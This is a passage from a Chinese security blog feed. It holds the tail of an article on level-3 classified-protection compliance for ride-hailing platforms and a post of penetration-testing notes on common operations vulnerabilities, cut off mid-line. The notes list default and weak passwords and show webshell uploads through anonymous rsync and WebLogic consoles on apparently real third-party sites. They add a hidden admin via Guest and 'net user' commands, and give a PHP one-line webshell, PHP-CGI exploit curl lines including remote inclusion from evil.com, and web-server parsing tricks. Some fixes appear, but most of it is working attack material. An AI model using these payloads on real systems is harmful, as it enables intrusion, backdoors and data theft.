src="http://blog.nsfocus.net/wp-content/uploads/2017/01/6-300x169.jpg" alt=""></p><p>由于网约车新政的落地实施，交管局明令要求各大网约车平台尽可能快的进行线上业务系统的三级等级保护测评，因为最终测评通过与否关系着该平台营业执照的办理。</p><p>以下以易到租车为例，详细阐述绿盟科技针对互联网用户的信息安全等级保护建设。</p><p>各网约车平台由于自身业务系统的差异，对预约系统应用架构会有不同的设计，但基本的技术构成是类似的，其各部分的功能也相似。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/7-300x169.jpg" alt=""></p><p>针对易到租车预约APP核心应用的等保三级安全建设，绿盟科技本着“重点防护，纵深防御”的原则，在各服务器区以防火墙作为区域安全边界，为提高预约业务的整体安全性，各区域边界防火墙采用功能与性能兼备的产品，由此在整体布局上形成了“多层异构防火墙”安全架构。从业务功能上考虑，把这种安全架构划分成四个安全区域：互联网接入区、DMZ区（接入WEB服务器、RA服务器）、核心业务区（接入APP服务器、DB服务器）、数据中心内网区。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/8-300x169.jpg" alt=""></p><p><strong>互联网接入区：</strong></p><ul><li>部署链路分担设备，提供多ISP的互联网接入。</li><li>部署流量清洗，防御DDOS攻击</li><li>部署外网边界防火墙，实现互联网与DMZ区隔离</li></ul><p><strong>DMZ区：</strong></p><ul><li>部署WAF，为WEB服务器提供深层次的安全保护；</li><li>部署WEB-APP边界防火墙，实现DMZ与核心业务区的隔离；</li></ul><p><strong>核心业务区</strong></p><ul><li>APP服务器与DB服务器间可部署防火墙实现访问控制；</li><li>部署内网边界防火墙，实现核心业务区与数据中心服务器区间的隔离；</li><li>DB服务器旁路接入DAS，实现对数据库的监听与审计</li></ul><p><strong>数据中心内网区</strong></p><ul><li>采用“核心 —— 边缘”分区模块化架构，各服务器区围绕网络核心区部署，</li><li>各服务器区与网络核心区之间通过防火墙做访问控制；</li><li>内网核心旁路接入SAS-H，实现对IP可达的所有设备的单点登录及运维审计</li></ul><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/9-300x169.jpg" alt=""></p><p>安全技术手段作为支撑，辅以绿盟科技等保咨询服务，为客户搭建信息安全管理与策略体系。如此双管齐下，既能满足国家信息安全等级保护相关政策与标准要求，又可为客户搭建等级化的安全保障体系，在全面防护中突出重点，帮助客户最终通过等保三级测评，不仅提升了安全防护能力，也间接增强了客户的核心竞争力。</p><h2 id="0x07-终-NSFOCUS-伴您扬帆远航"><a href="#0x07-终-NSFOCUS-伴您扬帆远航" class="headerlink" title="0x07 终-NSFOCUS 伴您扬帆远航"></a>0x07 终-NSFOCUS 伴您扬帆远航</h2><p>互联网行业的三级安全等保技术要求，既有与其它行业要求的共性，又有其自己的特点。</p><p>三级等保对于互联网企业既是一次命题考试，又是一次切实提升企业安全能力的好机会。作为等保技术要求的主要部分——网络安全，因其分散、覆盖面广和难以管理，也是整个等保安全的难点。绿盟科技从网络与安全融合、终端与边界融合、集中与分级融合等多个维度，覆盖了包括结构安全、访问控制、安全审计、边界完整性、入侵防范、恶意代码入侵和设备防护在内的绝大多数技术要求，为互联网客户提供完整的三级等保解决方案方案。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;From : &lt;a href=&quot;http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;随着互联网企业的迅猛发展，其自身核心业务安全性的不断提升和行业监管力度的不断加强，如何应对与日俱增的内部需求和外部驱动，本文分析了互联网企业面临的安全威胁及合规监管，以及业内现有的针对该行业的安全建设内容，然后提出了我们基于三级等保的互联网企业信息安全建设思路，从整体上发现并解决互联网行业的安全问题。&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="等级保护" scheme="http://www.pa55w0rd.club/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>安全运维那些洞-Aerfa</title>
    <link href="http://www.pa55w0rd.club/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E/"/>
    <id>http://www.pa55w0rd.club/安全运维那些洞/</id>
    <published>2018-10-29T03:46:20.000Z</published>
    <updated>2018-11-21T08:54:13.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-Readme"><a href="#0-Readme" class="headerlink" title="0 Readme "></a>0 Readme </h1><p>来源于网络，回馈于网络。</p><p>以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。</p><p>这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。</p><p>仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。</p><a id="more"></a><h1 id="1-ftp匿名访问或弱口令"><a href="#1-ftp匿名访问或弱口令" class="headerlink" title="1 ftp匿名访问或弱口令 "></a>1 ftp匿名访问或弱口令 </h1><h2 id="1-1-ftp匿名访问"><a href="#1-1-ftp匿名访问" class="headerlink" title="1.1 ftp匿名访问 "></a>1.1 ftp匿名访问 </h2><p>Username = anonymous &amp;&amp; password = (null )</p><p>（1）cmd下，ftp xx.xx.xx.xx</p><p>（2）文件夹，<a href="ftp://xx.xx.xx.xx" target="_blank" rel="noopener">ftp://xx.xx.xx.xx</a></p><h2 id="1-2-ftp常见弱口令"><a href="#1-2-ftp常见弱口令" class="headerlink" title="1.2 ftp常见弱口令 "></a>1.2 ftp常见弱口令 </h2><p>（1）从wooyun的漏洞案例中看来，常见的弱口令：</p><p>网站域名（例如baidu.com） <code>baidu / baidu</code></p><p>（2）从xx项目中（漏扫扫出），弱口令为：</p><p><code>ftp / ftp</code></p><p>（3）网站使用lampp套装，未修改默认ftp密码：</p><p><code>nobody / lampp</code></p><h2 id="1-3-边学边用"><a href="#1-3-边学边用" class="headerlink" title="1.3 边学边用 "></a>1.3 边学边用 </h2><p>xx.xx.xx.xx 匿名访问 ftp / ftp<br>均可以登录</p><p> 使用8uftp登陆：</p><p><img src="\assets\img\安全运维\file_html_3d03e9ebaafe6524.png" alt=""></p><p>在文件夹中直接输入地址登陆：</p><p><img src="\assets\img\安全运维\file_html_fc4bacc7b391f84f.png" alt=""></p><p>比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。</p><p>xx.xx.xx.xx yy学校</p><p><img src="\assets\img\安全运维\file_html_e8776ff5ccdeee62.png" alt=""></p><p>xx.xx.xx.xx zz学校</p><p><img src="\assets\img\安全运维\file_html_158b89f932faeb71.png" alt=""></p><h1 id="2-rsync匿名访问"><a href="#2-rsync匿名访问" class="headerlink" title="2 rsync匿名访问 "></a>2 rsync匿名访问 </h1><p>参考： drops.wooyun.org/papers/161</p><p>rsync是一个远程数据同步工具，用 “rsync<br>算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p><p>下载文件：</p><p> ./rsync -vzrtopg –progress<br><a href="mailto:--deleteusername@xxx.xxx.xxx.xxx" target="_blank" rel="noopener">--deleteusername@xxx.xxx.xxx.xxx</a>::out<br>/home/test/getfile</p><p>上传文件： </p><p>/user/bin/rsync -vzrtopg –progress<br>/home/test/getfile</p><h2 id="2-1-利用方法"><a href="#2-1-利用方法" class="headerlink" title="2.1 利用方法"></a>2.1 利用方法</h2><p>rsync<br>默认端口是873，可使用nmap进行扫描：</p><p>nmap –n –open –p 873 x.x.x.x/24</p><p>尝试上传、下载文件( kali<br>中)：</p><p>rsync 10.210.208.39:: </p><p>或 rsync –vvvv<br>rsync://10.210.208.39::</p><h2 id="2-2-安全配置"><a href="#2-2-安全配置" class="headerlink" title="2.2 安全配置"></a>2.2 安全配置</h2><ul><li><p>限定访问IP：IP<br>Tables防火墙或修改配置文件rsync.conf</p></li><li><p>不允许匿名访问，添加用户口令</p></li></ul><h2 id="2-3-活学活用"><a href="#2-3-活学活用" class="headerlink" title="2.3 活学活用 "></a>2.3 活学活用 </h2><ul><li>xx.xx.xx.xx 连接失败</li></ul><p><img src="\assets\img\安全运维\file_html_86a6c0dd0ec67cd3.png" alt=""></p><ul><li>通信成功，却不知道该如何操作</li></ul><p><img src="\assets\img\安全运维\file_html_d6ea7f3e9ce65313.png" alt=""></p><ul><li>可以查看到目录，但是进一步访问需要密码</li></ul><p><img src="\assets\img\安全运维\file_html_93d8b6936279365a.png" alt=""></p><p>可以查看到目录，但是禁止进一步访问</p><p>xx窝</p><p><img src="\assets\img\安全运维\file_html_d416cd4216771f91.png" alt=""></p><ul><li><a href="http://www.xxx.gov.cn" target="_blank" rel="noopener">http://www.xxx.gov.cn</a> xx局</li></ul><p><code>rsync -v xx.xx.xx.xx::</code></p><p><img src="\assets\img\安全运维\file_html_29db8cfd2f6f9255.png" alt=""></p><p>上传webshell: # rsync -av /root/Desktop/youxiu.aspx<br>xx.xx.xx.xx::Etest</p><p><img src="\assets\img\安全运维\file_html_7ba40be2f34f1334.png" alt=""></p><p>确认是否成功：# rsync -v xx.xx.xx.xx::Etest</p><p><img src="\assets\img\安全运维\file_html_ac23219ff525104.png" alt=""></p><p>获取wenshell: <a href="http://www.xx.cn/youxiu.aspx" target="_blank" rel="noopener">http://www.xx.cn/youxiu.aspx</a> admin</p><p><img src="\assets\img\安全运维\file_html_c97ac1aa5603d31e.png" alt=""></p><p>xx.xx.xx.xx yy公司OA系统</p><p><img src="\assets\img\安全运维\file_html_afd89947e3e3b0f4.png" alt=""></p><h1 id="3-DNS域传送漏洞"><a href="#3-DNS域传送漏洞" class="headerlink" title="3 DNS域传送漏洞 "></a>3 DNS域传送漏洞 </h1><p>参考： drops.wooyun.org/papers/64</p><p>DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p><h2 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1 漏洞成因 "></a>3.1 漏洞成因 </h2><p>默认安装BIND<br>，配置项中没有allow-transfer项，就会出现dns域传送<br>漏洞</p><p>域传送关键配置项:</p><p>allow-transfer{ipaddress;};<br>通过ip限制可进行域传送的服务器</p><p>allow-transfer{key transfer;};<br>通过key限制可以进行域传送的服务器</p><p>设置方式有两种：</p><ul><li><p>在option配置域</p></li><li><p>在zone配置域</p></li></ul><p>优先级为： zone &gt; option</p><h2 id="3-2-攻击方式"><a href="#3-2-攻击方式" class="headerlink" title="3.2 攻击方式 "></a>3.2 攻击方式 </h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。</p><ul><li>dos下进行测试</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ljn&gt;nslookup</span><br><span class="line"></span><br><span class="line">&gt; <span class="builtin-name">set</span> <span class="attribute">type</span>=ns</span><br><span class="line"></span><br><span class="line">&gt; 12306.cn</span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in"> server </span>dns1.zdnscloud.biz</span><br><span class="line"></span><br><span class="line">&gt; ls 12306.cn</span><br></pre></td></tr></table></figure><ul><li>kali中进行测试</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\# dig @<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> <span class="number">12306.</span>cn axfr</span><br><span class="line">(<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>为dns服务器IP，<span class="number">12306.</span>cn为测试域名)</span><br><span class="line"></span><br><span class="line">或 \# dnsenum <span class="number">12306.</span>cn</span><br></pre></td></tr></table></figure><h2 id="3-3-修复方案"><a href="#3-3-修复方案" class="headerlink" title="3.3 修复方案 "></a>3.3 修复方案 </h2><p>只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:</p><ul><li>限制IP</li><li>使用key认证。</li></ul><h1 id="4-weblogic弱口令"><a href="#4-weblogic弱口令" class="headerlink" title="4 weblogic弱口令 "></a>4 weblogic弱口令 </h1><p>参考： drops.wooyun.org/tips/402</p><h2 id="4-1-基本信息"><a href="#4-1-基本信息" class="headerlink" title="4.1 基本信息 "></a>4.1 基本信息 </h2><p>Weblogic是美国bea公司出品的一个application<br>server（基于javaee架构的中间件），BEA<br>Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。</p><p>很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。</p><p>默认weblogic管理员账号密码： <code>weblogic /weblogic</code></p><p>默认weblogic开放端口： 7001</p><p>默认weblogic访问路径：<br><code>http://xxxx:7001/console</code></p><p>从Default Passwords |<br>CIRT.net获取常见weblogic默认密码：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Oracle-WebLogic：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="number">11</span>g：weblogic / welcome1 (实践)</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic：system / password</span><br><span class="line"></span><br><span class="line">Oracle-Weblogic(Version: <span class="number">9.0</span> Beta(Diablo))：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：admin / security</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：mary / password</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：joe / password</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：wlcsystem / wlcsystem</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="built_in">Process</span> Integrator：wlpisystem / wlpisystem</span><br></pre></td></tr></table></figure></p><p>查看wooyun漏洞案例，积累常见弱口令：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">weblogic / weblogic123</span><br><span class="line"></span><br><span class="line">weblogic / <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line">admin / <span class="number">12345678</span></span><br></pre></td></tr></table></figure></p><h2 id="4-2-利用方式"><a href="#4-2-利用方式" class="headerlink" title="4.2 利用方式 "></a>4.2 利用方式 </h2><p>寻找weblogic服务器方法：</p><ul><li><p>使用 IIS PUT Scaner<br>扫描80、8080端口，查看HTTP<br>banner信息，确定为weblogic；</p></li><li><p>直接扫描7001端口或者baidu<br>inurl: :7001/console (待尝试)</p></li></ul><p>利用弱口令进入管理后台，在控制台部署一个web应用：</p><p>Deploy =&gt; web application modules =&gt; Deploy a new Web Application<br>Module… =&gt;upload your file(s) =&gt; Deploy</p><p>在Web应用中包含模块：必须要有一个servlet或JSP<br>web.xml文件，包含web应用程序的信息</p><h2 id="4-3-安全配置"><a href="#4-3-安全配置" class="headerlink" title="4.3 安全配置 "></a>4.3 安全配置 </h2><p><a href="http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454" target="_blank" rel="noopener">http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454</a></p><h2 id="4-4-现学现卖"><a href="#4-4-现学现卖" class="headerlink" title="4.4 现学现卖 "></a>4.4 现学现卖 </h2><p><a href="http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp</a></p><p><img src="\assets\img\安全运维\file_html_a09bb089c1c3b312.png" alt=""></p><p>weblogic / 12345678</p><p><img src="\assets\img\安全运维\file_html_6d6c9016367bb35b.png" alt=""></p><p>部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：</p><p>先制作war包（需安装java环境）：</p><p>c:\app&gt;cd c:/program files/java/dk1.8.0_31/bin</p><p>c:\Program Files\Java\jdk1.8.0_31\bin&gt;jar -cvf app.war c:/app</p><p><img src="\assets\img\安全运维\file_html_3493c9640cf370ac.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_ba1e3acff7df0d95.png" alt=""></p><p>部署——&gt;安装——&gt;上载文件——&gt;一直点确定即可，得到shell</p><p>（自己制作war包失败，重新下载了一个war包，上传）</p><p><a href="http://xx.xx.xx.xx:7001/index/a.jsp" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/index/a.jsp</a> (安全起见，已删除)</p><p><a href="http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW" target="_blank" rel="noopener">http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW</a></p><p><img src="\assets\img\安全运维\file_html_cf68ba09dbca62df.png" alt=""></p><p>翻目录：</p><p><img src="\assets\img\安全运维\file_html_63592e979d64fae2.png" alt=""></p><p><a href="http://xx.xx.xx.xx/weimall" target="_blank" rel="noopener">http://xx.xx.xx.xx/weimall</a> mall.xx.cn v.xx.cn</p><p><img src="\assets\img\安全运维\file_html_b9a7ba7d2ab3078c.png" alt=""></p><p><a href="http://xx.xx.xx.xx/fenxiao/" target="_blank" rel="noopener">http://xx.xx.xx.xx/fenxiao/</a> 米某网 </p><p><a href="http://xx.x.xx.xx/fenxiao/api/client/uc.php" target="_blank" rel="noopener">http://xx.x.xx.xx/fenxiao/api/client/uc.php</a> youxiu<br>（已修改时间，该shell好用）</p><p><code>net user</code></p><p><img src="\assets\img\安全运维\file_html_d3ed608fe971124a.png" alt=""></p><p><code>net user Guest xiuyou!</code></p><p><img src="\assets\img\安全运维\file_html_6ea978c38fc505e6.png" alt=""></p><p><code>net localgroup administrators</code></p><p><img src="\assets\img\安全运维\file_html_eae0acb1c41ca212.png" alt=""></p><p><code>net localgroup administrators Guest /add</code></p><p><img src="\assets\img\安全运维\file_html_60b78b69da695ec6.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_30d1210394b8be38.png" alt=""></p><p>mstsc打开远程终端，<code>Guest / xiuyou!</code></p><p><img src="\assets\img\安全运维\file_html_f8671774fb643b0f.png" alt=""></p><p>激活Guest用户 <code>net user Guest /active:yes</code></p><p><img src="\assets\img\安全运维\file_html_880a526fcaa8650a.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_25d3715c70e27e3d.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_790c103cd138a9e2.png" alt=""></p><h1 id="5-struts漏洞"><a href="#5-struts漏洞" class="headerlink" title="5 struts漏洞 "></a>5 struts漏洞 </h1><p>drops.wooyun.org/papers/902</p><p>sebug.net/appdir/Apache+Struts</p><p>Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。</p><h2 id="5-1-S2-016命令执行漏洞"><a href="#5-1-S2-016命令执行漏洞" class="headerlink" title="5.1 S2-016命令执行漏洞 "></a>5.1 S2-016命令执行漏洞 </h2><p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts<br>2.3.15.1以下版本均存在此漏洞。</p><h2 id="5-2-S2-017重定向漏洞"><a href="#5-2-S2-017重定向漏洞" class="headerlink" title="5.2 S2-017重定向漏洞 "></a>5.2 S2-017重定向漏洞 </h2><p>Apache Struts<br>2.0.0没有有效过滤”redirect:”/“redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。</p><h2 id="5-3-S2-019命令执行漏洞"><a href="#5-3-S2-019命令执行漏洞" class="headerlink" title="5.3 S2-019命令执行漏洞"></a>5.3 S2-019命令执行漏洞</h2><p>Struts2 是第二代基于Model-View-Controller<br>(MVC)模型的java企业级web应用框架。Apache<br>Struts 2.3.15.2之前版本的“Dynamic Method<br>Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><h1 id="6-web服务器解析漏洞"><a href="#6-web服务器解析漏洞" class="headerlink" title="6 web服务器解析漏洞 "></a>6 web服务器解析漏洞 </h1><p><a href="http://www.cnseay.com/806/" target="_blank" rel="noopener">www.cnseay.com/806/</a></p><h2 id="6-1-IIS-6-0"><a href="#6-1-IIS-6-0" class="headerlink" title="6.1 IIS 6.0 "></a>6.1 IIS 6.0 </h2><ul><li><p>后缀解析： /xx.asp;.jpg</p></li><li><p>目录解析： /xx.asp/xx.jpg<br>（xx.asp目录下可解析任何文件）</p></li><li><p>默认解析： xx.asa xx.cer xx.cdx<br>（IIS默认配置中，该类文件由asp.dll解析）</p></li><li><p>发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg</p></li></ul><h2 id="6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 "></a>6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 </h2><p>默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。</p><p>xx.jpg为一句话图片马，制作过程如下：</p><p><code>copy yy.jpg/b + zz.txt/a xx.jpg</code></p><p>/b：二进制模式</p><p>/a：ASCII模式</p><p>yy.jpg ：正常图片文件</p><p>zz.txt ：一句话 &lt;?PHP<br>fputs(fopen(‘shell.php’,’w’),’&lt;?PHP<br>eval(\$_POST\youxiu)?&gt;’);?&gt;</p><p>shell.php youxiu</p><h2 id="6-3-Nginx-lt-0-8-37"><a href="#6-3-Nginx-lt-0-8-37" class="headerlink" title="6.3 Nginx&lt;=0.8.37 "></a>6.3 Nginx&lt;=0.8.37 </h2><p>在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：</p><p>在文件路劲(xx.jpg)后面加上%00.php ，即<br>xx.jpg%00.php<br>会被当做php文件来解析</p><p>参照《Nginx空字节可远程执行代码漏洞》</p><h2 id="6-4-Apache"><a href="#6-4-Apache" class="headerlink" title="6.4 Apache "></a>6.4 Apache </h2><ul><li>后缀解析： test.php.x1.x2.x3<br>（x1,x2,x3为没有在mime.types文件中定义的文件类型）</li></ul><p>Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。</p><p>Apache可解析： php | php3 | phtml</p><p>参照《Apache漏洞之后缀名解析漏洞》</p><p>防范：在apache配置文件中添加禁止.php文件执行的语句：</p><p>&lt;Files ~ ”.(php.|php3.|phtml.)”&gt;</p><p>Order Allow,Deny</p><p>Deny from all</p><p>&lt;/Files&gt;</p><ul><li>若在Apache中，<br>.htaccess可被应用（即<br>AllowOverride=All）</li></ul><p>.htaccess可被上传</p><p>则在.htaccess中写入<br>(shell.jpg为上传文件，便可得到shell)</p><p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;</p><h2 id="6-5-lighttpd"><a href="#6-5-lighttpd" class="headerlink" title="6.5 lighttpd "></a>6.5 lighttpd </h2><p>xx.jpg/xx.php</p><h2 id="6-6-windows环境"><a href="#6-6-windows环境" class="headerlink" title="6.6 windows环境 "></a>6.6 windows环境 </h2><p>Windows环境下，文件 xx.jpg[空格]</p><p>文件 xx.jpg.</p><p>两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。</p><h1 id="7-PHP-CGI远程任意代码执行漏洞"><a href="#7-PHP-CGI远程任意代码执行漏洞" class="headerlink" title="7 PHP-CGI远程任意代码执行漏洞 "></a>7 PHP-CGI远程任意代码执行漏洞 </h1><p>zone.wooyun.org/content/151</p><p><a href="http://www.hackbase.com/tech/2012-05-07/66395.html" target="_blank" rel="noopener">www.hackbase.com/tech/2012-05-07/66395.html</a></p><p>该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：</p><p><img src="\assets\img\安全运维\file_html_7505e63d7f39ad25.png" alt=""></p><h2 id="7-1-本地包含执行代码"><a href="#7-1-本地包含执行代码" class="headerlink" title="7.1 本地包含执行代码 "></a>7.1 本地包含执行代码 </h2><p>curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;”</p><p><a href="http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n" target="_blank" rel="noopener">http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n</a> </p><p>（/proc/self/environ 为本地文件路径）</p><h2 id="7-2-远程包含执行代码"><a href="#7-2-远程包含执行代码" class="headerlink" title="7.2 远程包含执行代码 "></a>7.2 远程包含执行代码 </h2><p>Curl<br><a href="http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt" target="_blank" rel="noopener">http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a> </p><p>（%3d = %3a : %2f / ）</p><p>（<a href="http://www.evail.com/evil.txt为木马文件）" target="_blank" rel="noopener">http://www.evail.com/evil.txt为木马文件）</a></p><h1 id="8-FCK编辑器上传漏洞"><a href="#8-FCK编辑器上传漏洞" class="headerlink" title="8 FCK编辑器上传漏洞 "></a>8 FCK编辑器上传漏洞 </h1><h2 id="8-1-漏洞利用"><a href="#8-1-漏洞利用" class="headerlink" title="8.1 漏洞利用 "></a>8.1 漏洞利用 </h2><ul><li><p>编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》</p></li><li><p>编辑器 + web服务器解析漏洞</p></li><li><p>突破后台建立文件夹漏洞（. 变<br>_）</p></li></ul><h1 id="9-Apache-Server-Status对外暴露"><a href="#9-Apache-Server-Status对外暴露" class="headerlink" title="9 Apache Server Status对外暴露 "></a>9 Apache Server Status对外暴露 </h1><p><a href="http://www.ccvita.com/333.html" target="_blank" rel="noopener">www.ccvita.com/333.html</a></p><p>Apache 1.3.2及之后的版本自带查看Apache状态的功能模块<br>server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。</p><h2 id="9-1-利用方式"><a href="#9-1-利用方式" class="headerlink" title="9.1 利用方式 "></a>9.1 利用方式 </h2><p>未做限制访问的URL为：<a href="http://www.apache.org/server-status" target="_blank" rel="noopener">http://www.apache.org/server-status</a></p><h1 id="10-网站备份文件可下载"><a href="#10-网站备份文件可下载" class="headerlink" title="10 网站备份文件可下载 "></a>10 网站备份文件可下载 </h1><p>该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。</p><h2 id="10-1-利用方式"><a href="#10-1-利用方式" class="headerlink" title="10.1 利用方式 "></a>10.1 利用方式 </h2><p>常见备份目录为：</p><p><a href="http://www.xxx.com/xxx.rar" target="_blank" rel="noopener">http://www.xxx.com/xxx.rar</a></p><p><a href="http://www.xxx.com/xxx.zip" target="_blank" rel="noopener">http://www.xxx.com/xxx.zip</a></p><p><a href="http://aaa.xxx.com/aaa.rar" target="_blank" rel="noopener">http://aaa.xxx.com/aaa.rar</a></p><p><a href="http://bbb.xxx.com.cn/bbb.tar" target="_blank" rel="noopener">http://bbb.xxx.com.cn/bbb.tar</a></p><p><a href="http://bbb.xxx.com/sysadmin.tar.gz" target="_blank" rel="noopener">http://bbb.xxx.com/sysadmin.tar.gz</a></p><p>ip/<a href="http://www.xxx.com.zip" target="_blank" rel="noopener">www.xxx.com.zip</a></p><ul><li><p>直接在URL中访问，然后下载</p></li><li><p>使用curl工具 例如： curl -I<br><a href="http://www.fff.com/fff.zip" target="_blank" 